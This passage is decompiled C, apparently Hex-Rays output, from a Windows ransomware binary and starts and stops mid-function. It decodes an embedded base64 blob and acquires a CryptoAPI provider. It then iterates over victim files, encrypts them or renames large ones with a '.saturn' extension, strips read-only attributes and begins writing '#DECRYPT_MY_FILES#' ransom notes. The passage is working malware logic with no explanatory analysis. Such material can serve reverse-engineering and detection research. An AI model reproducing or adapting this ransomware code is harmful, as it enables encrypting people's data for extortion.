  char *v25[4]; // [esp-30h] [ebp-3Ch] BYREF
  int v26; // [esp-20h] [ebp-2Ch]
  unsigned int v27; // [esp-1Ch] [ebp-28h]
  char *v28; // [esp-18h] [ebp-24h]
  char *v29; // [esp-14h] [ebp-20h]
  int *v30; // [esp-10h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h]
  void *v32; // [esp-8h] [ebp-14h]
  int v33; // [esp-4h] [ebp-10h]
  int v34; // [esp+0h] [ebp-Ch]
  int v35; // [esp+4h] [ebp-8h]
  int v36; // [esp+8h] [ebp-4h] BYREF
  int retaddr; // [esp+Ch] [ebp+0h]

  v34 = a3;
  v35 = retaddr;
  v33 = -1;
  v32 = &loc_433B39;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v30 = &v36;
  v3 = a1;
  v28 = a2;
  v29 = a2;
  v4 = a1;
  v5 = a1[5] < 0x10u;
  v29 = (char *)a1;
  if ( !v5 )
  {
    v4 = (_DWORD *)*a1;
    v29 = (char *)*a1;
  }
  v6 = a1[4];
  if ( !v6 )
    goto LABEL_15;
  v7 = v6 - 1;
  v8 = -1;
  if ( v7 != -1 )
    v8 = v7;
  v9 = *((char *)v4 + v8);
  v10 = (char *)v4 + v8;
  if ( !memchr("\\/", v9, 2u) )
  {
    while ( v10 != v29 )
    {
      v11 = *--v10;
      if ( memchr("\\/", v11, 2u) )
        goto LABEL_9;
    }
    goto LABEL_15;
  }
LABEL_9:
  v12 = v10 - v29;
  if ( v12 == -1 )
  {
LABEL_15:
    v23[4] = 0;
    v24 = 15;
    LOBYTE(v23[0]) = 0;
    sub_401D10(v23, (void *)Locale, 0);
    v13 = v23;
    v14 = 1;
    goto LABEL_16;
  }
  v5 = v3[4] < v12;
  v26 = 0;
  if ( v5 )
    v12 = v3[4];
  v5 = v3[5] < 0x10u;
  v27 = 15;
  LOBYTE(v25[0]) = 0;
  if ( !v5 )
    v3 = (_DWORD *)*v3;
  sub_401D10(v25, v3, v12);
  v13 = v25;
  v14 = 10;
LABEL_16:
  v15 = v28;
  v16 = v14 | 4;
  v17 = *(_OWORD *)v13;
  *((_DWORD *)v28 + 4) = 0;
  *((_DWORD *)v15 + 5) = 0;
  *(_OWORD *)v15 = v17;
  *(_QWORD *)&v17 = *((_QWORD *)v13 + 2);
  v13[4] = 0;
  v13[5] = (char *)15;
  *((_QWORD *)v15 + 2) = v17;
  *(_BYTE *)v13 = 0;
  if ( (v16 & 2) != 0 )
  {
    v16 &= ~2u;
    v28 = (char *)v16;
    if ( v27 >= 0x10 )
    {
      v18 = v25[0];
      if ( v27 + 1 >= 0x1000 )
      {
        if ( ((int)v25[0] & 0x1F) != 0 )
          goto LABEL_36;
        v19 = (char *)*((_DWORD *)v25[0] - 1);
        if ( v19 >= v25[0] || (unsigned int)(v25[0] - v19) < 4 || (unsigned int)(v25[0] - v19) > 0x23 )
          goto LABEL_36;
        v18 = (char *)*((_DWORD *)v25[0] - 1);
      }
      j__free(v18);
      LOBYTE(v16) = (_BYTE)v28;
    }
    v26 = 0;
    v27 = 15;
    LOBYTE(v25[0]) = 0;
  }
  if ( (v16 & 1) != 0 && v24 >= 0x10 )
  {
    v20 = v23[0];
    if ( v24 + 1 < 0x1000 )
    {
LABEL_34:
      j__free(v20);
      return v15;
    }
    if ( ((int)v23[0] & 0x1F) == 0 )
    {
      v21 = (char *)*((_DWORD *)v23[0] - 1);
      if ( v21 < v23[0] && (unsigned int)(v23[0] - v21) >= 4 && (unsigned int)(v23[0] - v21) <= 0x23 )
      {
        v20 = (char *)*((_DWORD *)v23[0] - 1);
        goto LABEL_34;
      }
    }
LABEL_36:
    _invalid_parameter_noinfo_noreturn();
  }
  return v15;
}
// 407CE0: could not find valid save-restore pair for ebp

//----- (00407ED0) --------------------------------------------------------
int __fastcall sub_407ED0(int a1, char *a2)
{
  int v4; // ecx
  _DWORD *v5; // ecx
  int v6; // eax
  int v7; // ecx
  int v8; // edx
  int v9; // ecx
  int v10; // eax
  int v11; // ecx
  int v13; // [esp+14h] [ebp-CCh]
  __int64 v14[23]; // [esp+18h] [ebp-C8h] BYREF
  int v15; // [esp+DCh] [ebp-4h]

  memset(v14, 0, sizeof(v14));
  LODWORD(v14[0]) = &unk_442344;
  v15 = 0;
  v13 = 1;
  LODWORD(v14[14]) = &std::istream::`vftable';
  HIDWORD(v14[13]) = 88;
  v14[1] = 0i64;
  sub_40C0C0((struct std::ios_base *)&v14[14], (int)&v14[2], 0);
  v15 = 2;
  *(_DWORD *)((char *)v14 + *(_DWORD *)(LODWORD(v14[0]) + 4)) = &std::ifstream::`vftable';
  *(int *)((char *)&v13 + *(_DWORD *)(LODWORD(v14[0]) + 4)) = *(_DWORD *)(LODWORD(v14[0]) + 4) - 112;
  sub_40C000(&v14[2]);
  LODWORD(v14[2]) = &std::filebuf::`vftable';
  sub_40B9B0((int)&v14[2], 0, 0);
  LOBYTE(v15) = 3;
  if ( !sub_40BB70(&v14[2], a2, 37, v4) )
  {
    v5 = (_DWORD *)((char *)v14 + *(_DWORD *)(LODWORD(v14[0]) + 4));
    v6 = v5[3] | 6;
    if ( v5[14] )
      v6 = v5[3] | 2;
    sub_4043E0(v5, v6, 0);
  }
  v15 = 4;
  v7 = *(_DWORD *)((char *)&v14[7] + *(_DWORD *)(LODWORD(v14[0]) + 4));
  if ( v7 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v7 + 4))(v7);
  LOBYTE(v15) = 5;
  sub_40BF70((char *)v14, v7);
  LOBYTE(v15) = 6;
  v8 = v14[0];
  v9 = *(_DWORD *)(LODWORD(v14[0]) + 4);
  if ( (*((_BYTE *)&v14[1] + v9 + 4) & 6) != 0 )
  {
    *(_DWORD *)a1 = -1;
    *(_DWORD *)(a1 + 4) = -1;
    *(_DWORD *)(a1 + 8) = 0;
    *(_DWORD *)(a1 + 12) = 0;
    *(_QWORD *)(a1 + 16) = 0i64;
    LOBYTE(v15) = 8;
    v10 = *(_DWORD *)(v8 + 4);
  }
  else
  {
    (*(void (__thiscall **)(_DWORD, int, _DWORD, _DWORD, int, int))(**(_DWORD **)((char *)&v14[7] + v9) + 40))(
      *(_DWORD *)((char *)&v14[7] + v9),
      a1,
      0,
      0,
      1,
      1);
    LOBYTE(v15) = 7;
    v10 = *(_DWORD *)(LODWORD(v14[0]) + 4);
  }
  v11 = *(_DWORD *)((char *)&v14[7] + v10);
  if ( v11 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v11 + 8))(v11);
  *(_DWORD *)((char *)v14 + *(_DWORD *)(LODWORD(v14[0]) + 4)) = &std::ifstream::`vftable';
  *(int *)((char *)&v13 + *(_DWORD *)(LODWORD(v14[0]) + 4)) = *(_DWORD *)(LODWORD(v14[0]) + 4) - 112;
  sub_40A7C0(&v14[2]);
  *(_DWORD *)((char *)v14 + *(_DWORD *)(LODWORD(v14[0]) + 4)) = &std::istream::`vftable';
  *(int *)((char *)&v13 + *(_DWORD *)(LODWORD(v14[0]) + 4)) = *(_DWORD *)(LODWORD(v14[0]) + 4) - 24;
  v15 = 10;
  LODWORD(v14[14]) = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor((struct std::ios_base *)&v14[14]);
  return a1;
}
// 407FC6: variable 'v4' is possibly undefined
// 408031: variable 'v7' is possibly undefined
// 435FE0: using guessed type void *std::ios_base::`vftable';
// 436028: using guessed type void *std::filebuf::`vftable';
// 442350: using guessed type void *std::istream::`vftable';
// 442368: using guessed type void *std::ifstream::`vftable';

//----- (00408150) --------------------------------------------------------
void __thiscall sub_408150(_DWORD *this)
{
  struct std::ios_base *v1; // esi

  v1 = (struct std::ios_base *)(this + 28);
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*this + 4) - 112) = &std::ifstream::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*this + 4) - 116) = *(_DWORD *)(*this + 4) - 112;
  sub_40A7C0(this + 4);
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 28) + 4) - 112) = &std::istream::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 28) + 4) - 116) = *(_DWORD *)(*((_DWORD *)v1 - 28) + 4) - 24;
  *(_DWORD *)v1 = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(v1);
}
// 435FE0: using guessed type void *std::ios_base::`vftable';
// 442350: using guessed type void *std::istream::`vftable';
// 442368: using guessed type void *std::ifstream::`vftable';

//----- (004081E0) --------------------------------------------------------
char *__fastcall sub_4081E0(char *Src, _DWORD *a2)
{
  struct std::locale::_Locimp *v4; // ecx
  int v5; // ebx
  int v6; // ecx
  _DWORD *v7; // eax
  struct std::_Facet_base *v8; // eax
  void (__thiscall ***v9)(_DWORD, int); // eax
  char v11; // [esp+14h] [ebp-24h]
  char v12; // [esp+1Ch] [ebp-1Ch]
  int v13; // [esp+20h] [ebp-18h] BYREF
  struct std::locale::_Locimp *v14; // [esp+24h] [ebp-14h]
  int v15; // [esp+34h] [ebp-4h]
  int savedregs; // [esp+38h] [ebp+0h] BYREF

  v13 = 0;
  v4 = std::locale::_Init(1);
  v14 = v4;
  v15 = 2;
  *((_DWORD *)Src + 4) = 0;
  *((_DWORD *)Src + 5) = 15;
  *Src = 0;
  v5 = 0;
  if ( a2[4] )
  {
    v6 = 0;
    do
    {
      v7 = a2;
      if ( a2[5] >= 0x10u )
        v7 = (_DWORD *)*a2;
      v11 = *((_BYTE *)v7 + v6);
      v8 = sub_40C210((int)&savedregs, (int)&v13);
      v12 = (*(int (__thiscall **)(struct std::_Facet_base *, char))(*(_DWORD *)v8 + 24))(v8, v11);
      sub_401B40(Src, v12);
      v6 = (__int16)++v5;
    }
    while ( (unsigned int)(__int16)v5 < a2[4] );
    v4 = v14;
  }
  v15 = 3;
  if ( v4 )
  {
    v9 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(struct std::locale::_Locimp *))(*(_DWORD *)v4 + 8))(v4);
    if ( v9 )
      (**v9)(v9, 1);
  }
  return Src;
}

//----- (004082E0) --------------------------------------------------------
void __usercall sub_4082E0(
        int a1@<ebp>,
        int a2@<edi>,
        int a3@<esi>,
        unsigned int a4,
        int a5,
        int a6,
        int a7,
        size_t a8,
        unsigned int a9,
        unsigned int a10,
        int a11,
        int a12,
        int a13,
        size_t a14,
        unsigned int a15)
{
  unsigned int v15; // esi
  void *v16; // eax
  unsigned int v17; // ecx
  unsigned int i; // edi
  _DWORD *v19; // eax
  bool v20; // cf
  size_t v21; // ecx
  unsigned int v22; // edi
  __int128 *v23; // eax
  void *st_atime; // eax
  unsigned int v25; // ecx
  char *v26; // edi
  const CHAR *v27; // ecx
  char *j; // esi
  unsigned __int64 v29; // kr00_8
  char *v30; // edx
  char *v31; // eax
  void *v32; // eax
  char **v33; // eax
  unsigned int v34; // eax
  char *v35; // eax
  char *v36; // ecx
  char **v37; // eax
  _DWORD *v38; // eax
  char **v39; // eax
  void *v40; // eax
  unsigned int v41; // ecx
  _QWORD *v42; // eax
  const CHAR *v43; // eax
  const CHAR *v44; // ecx
  CHAR *v45; // edx
  unsigned int v46; // eax
  const CHAR *v47; // ecx
  DWORD FileAttributesA; // eax
  char *v49; // eax
  int v50; // ecx
  _DWORD *v51; // edx
  int v52; // eax
  _DWORD *v53; // edx
  char *v54; // edx
  int v55; // eax
  const CHAR *v56; // ecx
  const CHAR *v57; // eax
  const CHAR *v58; // ecx
  const CHAR *v59; // eax
  const char *v60; // eax
  char *v61; // eax
  const CHAR *v62; // ecx
  bool v63; // zf
  int v64; // eax
  char *v65; // edx
  _DWORD *v66; // ecx
  _DWORD *v67; // edx
  char *v68; // edx
  int v69; // eax
  char *p_st_atime; // eax
  char *v71; // edx
  int v72; // eax
  unsigned int *v73; // edx
  unsigned int v74; // eax
  void *v75; // eax
  unsigned int v76; // eax
  _DWORD *v77; // eax
  unsigned int *v78; // eax
  char **v79; // eax
  char **v80; // ecx
  char **v81; // eax
  int v82; // eax
  unsigned int *v83; // edx
  unsigned int v84; // eax
  void *v85; // eax
  char *v86; // eax
  void *v87; // eax
  unsigned int v88; // ecx
  char *v89; // eax
  char *v90; // ecx
  void *v91; // eax
  unsigned int v92; // ecx
  char *v93; // eax
  char *v94; // ecx
  void *v95; // eax
  unsigned int v96; // ecx
  const CHAR *v97; // ecx
  const CHAR *v98; // eax
  void *v99; // eax
  unsigned int v100; // ecx
  void *v101; // eax
  unsigned int v102; // ecx
  char *v103; // eax
  char *v104; // ecx
  void *v105; // esi
  unsigned int v106; // eax
  unsigned int v107; // eax
  void *v108; // eax
  unsigned int v109; // ecx
  DWORD LastError; // eax
  const CHAR *v111; // esi
  FILE *v112; // eax
  FILE *v113; // eax
  FILE *v114; // eax
  void *v115; // eax
  unsigned int v116; // ecx
  void *v117; // eax
  unsigned int v118; // ecx
  void *v119; // eax
  unsigned int v120; // ecx
  void *v121; // eax
  unsigned int v122; // ecx
  void *v123; // eax
  unsigned int v124; // ecx
  void *v125; // eax
  unsigned int v126; // ecx
  void *v127; // eax
  unsigned int v128; // ecx
  __int128 v129; // [esp-560h] [ebp-56Ch] BYREF
  size_t v130; // [esp-550h] [ebp-55Ch]
  unsigned int v131; // [esp-54Ch] [ebp-558h]
  char *v132[5]; // [esp-548h] [ebp-554h] BYREF
  size_t v133; // [esp-534h] [ebp-540h]
  __int128 v134; // [esp-530h] [ebp-53Ch] BYREF
  LPCSTR v135; // [esp-520h] [ebp-52Ch]
  int v136; // [esp-51Ch] [ebp-528h]
  _DWORD v137[8]; // [esp-518h] [ebp-524h] BYREF
  char *v138[5]; // [esp-4F8h] [ebp-504h] BYREF
  unsigned int v139; // [esp-4E4h] [ebp-4F0h]
  char **v140; // [esp-4E0h] [ebp-4ECh]
  unsigned int v141; // [esp-4DCh] [ebp-4E8h]
  __int128 v142; // [esp-4D8h] [ebp-4E4h] BYREF
  __int64 v143; // [esp-4C8h] [ebp-4D4h]
  unsigned int *v144; // [esp-4C0h] [ebp-4CCh]
  const void *v145; // [esp-4BCh] [ebp-4C8h]
  char *v146; // [esp-4B8h] [ebp-4C4h]
  int v147; // [esp-4B4h] [ebp-4C0h]
  unsigned int v148; // [esp-4B0h] [ebp-4BCh]
  unsigned int v149; // [esp-4ACh] [ebp-4B8h]
  _DWORD v150[44]; // [esp-4A8h] [ebp-4B4h] BYREF
  _DWORD v151[48]; // [esp-3F8h] [ebp-404h] BYREF
  _DWORD v152[44]; // [esp-338h] [ebp-344h] BYREF
  struct _stat64i32 v153; // [esp-288h] [ebp-294h] BYREF
  _DWORD v154[5]; // [esp-258h] [ebp-264h] BYREF
  unsigned int v155; // [esp-244h] [ebp-250h]
  _DWORD v156[5]; // [esp-240h] [ebp-24Ch] BYREF
  unsigned int v157; // [esp-22Ch] [ebp-238h]
  _DWORD *v158; // [esp-228h] [ebp-234h] BYREF
  const CHAR *v159; // [esp-218h] [ebp-224h]
  unsigned int v160; // [esp-214h] [ebp-220h]
  _DWORD v161[4]; // [esp-210h] [ebp-21Ch] BYREF
  const CHAR *v162; // [esp-200h] [ebp-20Ch]
  unsigned int v163; // [esp-1FCh] [ebp-208h]
  _DWORD v164[4]; // [esp-1F8h] [ebp-204h] BYREF
  const CHAR *v165; // [esp-1E8h] [ebp-1F4h]
  unsigned int v166; // [esp-1E4h] [ebp-1F0h]
  HCRYPTPROV v167[2]; // [esp-1E0h] [ebp-1ECh] BYREF
  _DWORD v168[4]; // [esp-1D8h] [ebp-1E4h] BYREF
  size_t v169; // [esp-1C8h] [ebp-1D4h]
  unsigned int v170; // [esp-1C4h] [ebp-1D0h]
  __int128 v171; // [esp-1C0h] [ebp-1CCh] BYREF
  __int64 v172; // [esp-1B0h] [ebp-1BCh]
  char *v173; // [esp-1A8h] [ebp-1B4h]
  __int128 v174; // [esp-1A4h] [ebp-1B0h] BYREF
  __int64 v175; // [esp-194h] [ebp-1A0h]
  __int64 v176; // [esp-18Ch] [ebp-198h] BYREF
  int v177; // [esp-184h] [ebp-190h]
  char *v178[4]; // [esp-180h] [ebp-18Ch] BYREF
  int v179; // [esp-170h] [ebp-17Ch]
  unsigned int v180; // [esp-16Ch] [ebp-178h]
  __int128 v181; // [esp-168h] [ebp-174h] BYREF
  size_t v182; // [esp-158h] [ebp-164h]
  unsigned int v183; // [esp-154h] [ebp-160h]
  int v184; // [esp-150h] [ebp-15Ch]
  char *v185[4]; // [esp-14Ch] [ebp-158h] BYREF
  const CHAR *v186; // [esp-13Ch] [ebp-148h]
  unsigned int v187; // [esp-138h] [ebp-144h]
  unsigned __int64 v188; // [esp-134h] [ebp-140h] BYREF
  int v189; // [esp-12Ch] [ebp-138h]
  CHAR v190; // [esp-128h] [ebp-134h] BYREF
  int *v191; // [esp-14h] [ebp-20h]
  _DWORD *v192; // [esp-10h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h]
  void *v194; // [esp-8h] [ebp-14h]
  int v195; // [esp-4h] [ebp-10h]
  _DWORD v196[2]; // [esp+0h] [ebp-Ch] BYREF
  int v197; // [esp+8h] [ebp-4h] BYREF
  void *retaddr; // [esp+Ch] [ebp+0h]

  v196[0] = a1;
  v196[1] = retaddr;
  v195 = -1;
  v194 = &loc_433E18;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v191 = &v197;
  v137[2] = a3;
  v137[1] = a2;
  v192 = v137;
  v15 = 0;
  v147 = 0;
  v195 = 1;
  sub_404600();
  v182 = 0;
  v183 = 15;
  LOBYTE(v181) = 0;
  sub_401D10(
    (char **)&v181,
    "Y25ncBFuD20HcBF0A3EYSUlEBjwubiErcykrISNxMCovKzRwKi84KHMyITE/cTMtIDw+IDYrKmxZBCt0FTQ1MTo+M3A7ITs/czYtODQidiUsIis/NW46"
    "JTYjIXQiJTMzMHRNWmFjY2B+fWl5fHx7bm5jan1vY2Ngfn1peXx8e25uY2p9b2NjYH59aXl8fHtubmNkWnNgbgk8Jyo4PjAyYyIgI3ArID05MjwodCU5"
    "M2NhGigiYgw8IiQjISZzcTAxLCNnODY6Pj5pf2sjJiZ4Nyw8NyItJCsuJ34rJjZbXHFtbhUlLG4nOX1aTmd/cR8tYzovNWIaIT9zEjY7JiIzMW9uKCAn"
    "IG46NjI3PSU0bEljbmc4Njo+d3x/NyFiZSY0Kz4kMSQrJzcnJGo7Pzg5LUlEc35iCCEhPz8zdCU5M2MqIDQkMDstOTo/KidxPjhjNyYicDIvKShZc2l5"
    "fHx7bm5jan1vY2Ngfn1peXx8e25uY2p9b2NjYH59aXl8fHtubmNqfW9jY24=",
    0x20Cu);
  LOBYTE(v195) = 2;
  sub_402080(&v134, (int *)&v181);
  sub_4021A0((_DWORD *)v134, SDWORD1(v134), SDWORD2(v134), SHIDWORD(v134), (unsigned int)v135, v136);
  LOBYTE(v195) = 4;
  if ( v183 >= 0x10 )
  {
    v16 = (void *)v181;
    if ( v183 + 1 >= 0x1000 )
    {
      if ( (v181 & 0x1F) != 0 )
        goto LABEL_16;
      v17 = *(_DWORD *)(v181 - 4);
      if ( v17 >= (unsigned int)v181 || (unsigned int)v181 - v17 < 4 || (unsigned int)v181 - v17 > 0x23 )
        goto LABEL_16;
      v16 = *(void **)(v181 - 4);
    }
    j__free(v16);
  }
  v182 = 0;
  v183 = 15;
  LOBYTE(v181) = 0;
  sub_407A60((unsigned int)v161);
  LOBYTE(v195) = 5;
  sub_401A10(v156, &a4);
  LOBYTE(v195) = 6;
  sub_401A10(&v134, &a4);
  sub_413130((_DWORD *)v134, SDWORD1(v134), SDWORD2(v134), SHIDWORD(v134), (size_t)v135, v136);
  LOBYTE(v195) = 7;
  sub_4081E0((char *)v164, v154);
  if ( CryptAcquireContextA(v167, 0, "Microsoft Enhanced Cryptographic Provider v1.0", 1u, 0xF0000000)
    || GetLastError() == -2146893802
    && CryptAcquireContextA(v167, 0, "Microsoft Enhanced Cryptographic Provider v1.0", 1u, 0x28u) )
  {
    v167[1] = 0;
  }
  v176 = 0i64;
  v177 = 0;
  LOBYTE(v195) = 11;
  sub_407900((int *)&v176);
  GetModuleFileNameA(0, &v190, 0x104u);
  for ( i = 0; ; i = v141 + 1 )
  {
    v141 = i;
    if ( i >= (HIDWORD(v176) - (int)v176) / 24 )
      break;
    v19 = (_DWORD *)(v176 + 24 * i);
    v182 = 0;
    v183 = 0;
    v20 = v19[5] < 0x10u;
    v21 = v19[4];
    v148 = (unsigned int)v19;
    v147 = v21;
    if ( !v20 )
    {
      v19 = (_DWORD *)*v19;
      v148 = (unsigned int)v19;
    }
    if ( v21 >= 0x10 )
    {
      v22 = v21 | 0xF;
      if ( (v21 | 0xF) > 0x7FFFFFFF )
        v22 = 0x7FFFFFFF;
      LODWORD(v181) = sub_401C70(v22 + 1);
      memmove_0((void *)v181, (const void *)v148, v147 + 1);
      v21 = v147;
    }
    else
    {
      v22 = 15;
      v181 = *(_OWORD *)v19;
    }
    v183 = v22;
    v182 = v21;
    LOBYTE(v195) = 12;
    v23 = &v181;
    if ( v22 >= 0x10 )
      v23 = (__int128 *)v181;
    sub_401D10((char **)&Src, v23, v21);
    v188 = 0i64;
    v189 = 0;
    LOBYTE(v195) = 13;
    sub_401A10(&v153.st_atime, &Src);
    v149 = v15 | 2;
    LOBYTE(v195) = 14;
    sub_402730((int *)&v188, &v153.st_atime, &dword_45384C, 1);
    LOBYTE(v195) = 13;
    if ( HIDWORD(v153.st_ctime) >= 0x10 )
    {
      st_atime = (void *)v153.st_atime;
      if ( (unsigned int)(HIDWORD(v153.st_ctime) + 1) >= 0x1000 )
      {
        if ( (v153.st_atime & 0x1F) != 0 )
          goto LABEL_16;
        v25 = *(_DWORD *)(LODWORD(v153.st_atime) - 4);
        if ( v25 >= LODWORD(v153.st_atime) || LODWORD(v153.st_atime) - v25 < 4 || LODWORD(v153.st_atime) - v25 > 0x23 )
          goto LABEL_16;
        st_atime = *(void **)(LODWORD(v153.st_atime) - 4);
      }
      j__free(st_atime);
    }
    v26 = (char *)HIDWORD(v188);
    v29 = v188;
    v184 = HIDWORD(v29);
    v27 = (const CHAR *)v29;
    for ( j = (char *)v188; ; j += 24 )
    {
      v173 = j;
      v148 = v149;
      if ( j == v26 )
        break;
      v30 = j;
      if ( *((_DWORD *)j + 5) >= 0x10u )
        v30 = *(char **)j;
      v186 = 0;
      v187 = 15;
      LOBYTE(v185[0]) = 0;
      v146 = v30 + 1;
      sub_401D10(v185, v30, strlen(v30));
      v31 = (char *)v185;
      if ( v187 >= 0x10 )
        v31 = v185[0];
      v146 = v31;
      LOBYTE(v195) = 16;
      v179 = 0;
      v147 = v149 | 4;
      v180 = 15;
      LOBYTE(v178[0]) = 0;
      sub_40C620(v178, *((_DWORD *)j + 4) + 1);
      v32 = j;
      if ( *((_DWORD *)j + 5) >= 0x10u )
        v32 = *(void **)j;
      sub_4036D0(v178, v32, *((_DWORD *)j + 4));
      sub_4036D0(v178, ".", 1u);
      v33 = sub_4036D0(v178, "saturn", 6u);
      v172 = 0i64;
      v171 = *(_OWORD *)v33;
      v172 = *((_QWORD *)v33 + 2);
      v33[4] = 0;
      v33[5] = (char *)15;
      *(_BYTE *)v33 = 0;
      v34 = v148 & 0xFFFFFFF3 | 8;
      v148 = v34;
      v149 = v34;
      LOBYTE(v195) = 18;
      if ( v180 >= 0x10 )
      {
        v35 = v178[0];
        if ( v180 + 1 >= 0x1000 )
        {
          if ( ((int)v178[0] & 0x1F) != 0 )
            goto LABEL_16;
          v36 = (char *)*((_DWORD *)v178[0] - 1);
          if ( v36 >= v178[0] || (unsigned int)(v178[0] - v36) < 4 || (unsigned int)(v178[0] - v36) > 0x23 )
            goto LABEL_16;
          v35 = (char *)*((_DWORD *)v178[0] - 1);
        }
        j__free(v35);
        v34 = v148;
      }
      LOBYTE(v195) = 19;
      v143 = 0xF00000000i64;
      v147 = v34 | 0x10;
      LOBYTE(v142) = 0;
      sub_40C620((char **)&v142, (unsigned int)(v186 + 1));
      v37 = v185;
      v136 = (int)v186;
      if ( v187 >= 0x10 )
        v37 = (char **)v185[0];
      sub_4036D0((char **)&v142, v37, v136);
      sub_4036D0((char **)&v142, ".", 1u);
      v38 = v161;
      v136 = (int)v162;
      if ( v163 >= 0x10 )
        v38 = (_DWORD *)v161[0];
      v39 = sub_4036D0((char **)&v142, v38, v136);
      v175 = 0i64;
      v174 = *(_OWORD *)v39;
      v175 = *((_QWORD *)v39 + 2);
      v39[4] = 0;
      v39[5] = (char *)15;
      *(_BYTE *)v39 = 0;
      v149 = v149 & 0xFFFFFFCF | 0x20;
      LOBYTE(v195) = 21;
      if ( HIDWORD(v143) >= 0x10 )
      {
        v40 = (void *)v142;
        if ( (unsigned int)(HIDWORD(v143) + 1) >= 0x1000 )
        {
          if ( (v142 & 0x1F) != 0 )
            goto LABEL_16;
          v41 = *(_DWORD *)(v142 - 4);
          if ( v41 >= (unsigned int)v142 || (unsigned int)v142 - v41 < 4 || (unsigned int)v142 - v41 > 0x23 )
            goto LABEL_16;
          v40 = *(void **)(v142 - 4);
        }
        j__free(v40);
      }
      v143 = 0xF00000000i64;
      LOBYTE(v142) = 0;
      v42 = (_QWORD *)sub_407ED0((int)&v153.st_atime, v146);
      if ( (__int64)(*v42 + v42[1]) >= 209715200 )
      {
        v97 = (const CHAR *)&v171;
        v98 = (const CHAR *)v185;
        if ( HIDWORD(v172) >= 0x10 )
          v97 = (const CHAR *)v171;
        v136 = (int)v97;
        if ( v187 >= 0x10 )
          v98 = v185[0];
        MoveFileA(v98, (LPCSTR)v136);
      }
      else
      {
        v43 = (const CHAR *)v156;
        v44 = (const CHAR *)&v174;
        v45 = j;
        if ( v157 >= 0x10 )
          v43 = (const CHAR *)v156[0];
        if ( HIDWORD(v175) >= 0x10 )
          v44 = (const CHAR *)v174;
        if ( *((_DWORD *)j + 5) >= 0x10u )
          v45 = *(CHAR **)j;
        sub_402270(v45, v44, v43);
        v46 = *((_DWORD *)j + 5);
        v47 = j;
        if ( v46 >= 0x10 )
          v47 = *(const CHAR **)j;
        v148 = (unsigned int)j;
        if ( v46 >= 0x10 )
          v148 = *(_DWORD *)j;
        FileAttributesA = GetFileAttributesA(v47);
        SetFileAttributesA((LPCSTR)v148, FileAttributesA & 0xFFFFFFFE);
        memset(v151, 0, sizeof(v151));
        v49 = (char *)&v174;
        v151[0] = &unk_44235C;
        if ( HIDWORD(v175) >= 0x10 )
          v49 = (char *)v174;
        v146 = v49;
        v151[4] = &unk_442324;
        v151[30] = &std::ios::`vftable';
        LOBYTE(v195) = 22;
        v149 |= 0x40u;
        v147 = v149;
        sub_40BD50(v151, (int)&v151[6], v136);
        v195 = 23;
        *(_DWORD *)((char *)v151 + *(_DWORD *)(v151[0] + 4)) = &std::fstream::`vftable';
        *(_DWORD *)((char *)&v150[43] + *(_DWORD *)(v151[0] + 4)) = *(_DWORD *)(v151[0] + 4) - 120;
        sub_40C000(&v151[6]);
        v151[6] = &std::filebuf::`vftable';
        sub_40B9B0((int)&v151[6], 0, 0);
        LOBYTE(v195) = 24;
        if ( !sub_40BB70(&v151[6], v146, 42, v50) )
        {
          v136 = 0;
          v51 = (_DWORD *)((char *)v151 + *(_DWORD *)(v151[0] + 4));
          v52 = v51[3] | 6;
          if ( v51[14] )
            v52 = v51[3] | 2;
          sub_4043E0(v51, v52, v136);
        }
        *(_DWORD *)((char *)v151 + *(_DWORD *)(v151[0] + 4)) = &std::fstream::`vftable';
        *(_DWORD *)((char *)&v150[43] + *(_DWORD *)(v151[0] + 4)) = *(_DWORD *)(v151[0] + 4) - 120;
        LOBYTE(v195) = 25;
        v53 = v164;
        v136 = (int)v165;
        if ( v166 >= 0x10 )
          v53 = (_DWORD *)v164[0];
        sub_40C920((char *)&v151[4], (int)v53, v136);
        if ( !sub_40BAB0((int)&v151[6]) )
        {
          v136 = 0;
          v54 = (char *)v151 + *(_DWORD *)(v151[0] + 4);
          v55 = *((_DWORD *)v54 + 3) | 6;
          if ( *((_DWORD *)v54 + 14) )
            v55 = *((_DWORD *)v54 + 3) | 2;
          sub_4043E0((_DWORD *)((char *)v151 + *(_DWORD *)(v151[0] + 4)), v55, v136);
        }
        v56 = (const CHAR *)v185;
        v136 = 9;
        if ( v187 >= 0x10 )
          v56 = v185[0];
        v57 = (const CHAR *)&v174;
        v135 = v56;
        if ( HIDWORD(v175) >= 0x10 )
          v57 = (const CHAR *)v174;
        MoveFileExA(v57, v135, v136);
        v58 = (const CHAR *)&v171;
        v136 = 1;
        if ( HIDWORD(v172) >= 0x10 )
          v58 = (const CHAR *)v171;
        v59 = (const CHAR *)v185;
        v135 = v58;
        if ( v187 >= 0x10 )
          v59 = v185[0];
        MoveFileExA(v59, v135, v136);
        sub_407CE0(v185, (char *)v168, (int)v196);
        LOBYTE(v195) = 26;
        sub_40C3B0(v178, v168, "\\#DECRYPT_MY_FILES#.txt");
        v60 = (const char *)v178;
        if ( v180 >= 0x10 )
          v60 = v178[0];
        if ( _stat64i32(v60, &v153) )
        {
          LOBYTE(v195) = 28;
          sub_40C3B0((char **)&v153.st_atime, v168, "\\#DECRYPT_MY_FILES#.html");
          memset(v152, 0, sizeof(v152));
          v152[0] = &unk_442324;
          LOBYTE(v195) = 30;
          v152[26] = &std::ostream::`vftable';
          v149 |= 0x200u;
          v147 = v149;
          v152[25] = 96;
          sub_40C0C0((struct std::ios_base *)&v152[26], (int)&v152[1], 0);
          v195 = 32;
          *(_DWORD *)((char *)v152 + *(_DWORD *)(v152[0] + 4)) = &std::ofstream::`vftable';
